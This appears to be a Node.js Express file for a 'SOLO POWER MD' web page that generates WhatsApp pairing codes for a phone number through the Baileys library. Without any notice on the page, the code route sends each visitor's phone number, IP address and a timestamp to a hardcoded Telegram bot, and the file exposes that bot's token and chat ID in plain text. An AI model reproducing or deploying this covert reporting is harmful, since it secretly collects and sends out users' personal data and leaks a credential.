const express = require('express');
const app = express();

const TELEGRAM_TOKEN = "8952397200:AAEeabntzeI3igmp9yPwWwcK9fVHD5KxTc8";
const TELEGRAM_CHAT_ID = "8802181538";

async function sendToTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" })
    });
  } catch (e) {}
}

app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SOLO POWER MD</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}.box{background:#0e0e12;border:2px solid #a855f7;border-radius:28px;padding:26px 20px;width:100%;max-width:430px;text-align:center}.wolf{width:120px;height:120px;margin:0 auto 12px;border-radius:50%;border:3px solid #a855f7;object-fit:cover}h1{color:#a855f7;font-size:28px;font-weight:900}input,select{width:100%;padding:13px;background:#000;border:1px solid #333;border-radius:12px;color:#fff;margin-top:8px;text-align:center}select{border-color:#a855f7;color:#a855f7;font-weight:700}button{margin-top:12px;width:100%;padding:14px;background:#a855f7;border:none;border-radius:12px;color:#fff;font-weight:900;cursor:pointer}#res{margin-top:14px;background:#111;padding:12px;border-radius:12px;color:#999;min-height:40px;word-break:break-all}.code{color:#a855f7;font-size:26px;font-weight:900}</style></head><body><div class="box"><img class="wolf" src="https://images.unsplash.com/photo-1518710843675-2540dd79065c?q=80&w=300&auto=format&fit=crop"><h1>🐺 SOLO POWER MD</h1><input id="num" placeholder="92300XXXXXXX"><select id="server"><option value="1">SERVER 1</option><option value="5">SERVER 5</option><option value="10">SERVER 10</option><option value="12" selected>SERVER 12 - Best</option><option value="15">SERVER 15 - Beast</option></select><button id="btn" onclick="activate()">GET CODE</button><div id="res">Number likhen</div></div><script>async function activate(){let n=document.getElementById('num').value.replace(/[^0-9]/g,'');let s=document.getElementById('server').value;let r=document.getElementById('res');let b=document.getElementById('btn');if(n.length<10){r.innerHTML='❌ sahi number';return}b.innerText='WAIT...';b.disabled=true;r.innerHTML='Server '+s+' wait...';try{let d=await fetch('/code?number='+n+'&server='+s).then(x=>x.json());if(d.code){let c=d.code.toUpperCase();if(c.length==8)c=c.slice(0,4)+'-'+c.slice(4);r.innerHTML='READY Server '+s+'<br><b class=code>'+c+'</b>';b.innerText='DONE';b.disabled=false}else{r.innerHTML='❌ '+(d.error||'Error');b.innerText='TRY AGAIN';b.disabled=false}}catch(e){r.innerHTML='❌ '+e.message;b.innerText='TRY AGAIN';b.disabled=false}}</script></body></html>`);
});

app.get('/code', async (req, res) => {
  try {
    let num = (req.query.number || '').replace(/[^0-9]/g, '');
    let serverCount = req.query.server || '12';
    if (!num) return res.json({ error: 'number missing' });

    let ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    let msg = "🐺 *SOLO POWER MD NEW USER*\\n\\n📱 Number: " + num + "\\n🖥️ Server: " + serverCount + "\\n🌍 IP: " + ip + "\\n⏰ " + new Date().toLocaleString();
    sendToTelegram(msg);

    const baileys = require('@whiskeysockets/baileys');
    const pino = require('pino');
    const fs = require('fs');
    const path = require('path');
    const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore } = baileys;
    const dir = path.join('/tmp', 'solo_' + Date.now());
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const sock = makeWASocket({
      version: [2, 3000, 1023223821],
      auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
      logger: pino({ level: 'silent' }),
      browser: ['SOLO POWER MD SERVER ' + serverCount, 'Chrome', '121'],
      printQRInTerminal: false
    });
    sock.ev.on('creds.update', saveCreds);
    await new Promise(r => setTimeout(r, 3000));
    let code = await sock.requestPairingCode(num);
    res.json({ code: code.toUpperCase(), server: serverCount });
    setTimeout(() => { try { sock.end(); fs.rmSync(dir, { recursive: true, force: true }); } catch {} }, 25000);
  } catch (e) {
    res.json({ error: e.message });
  }
});

module.exports = app;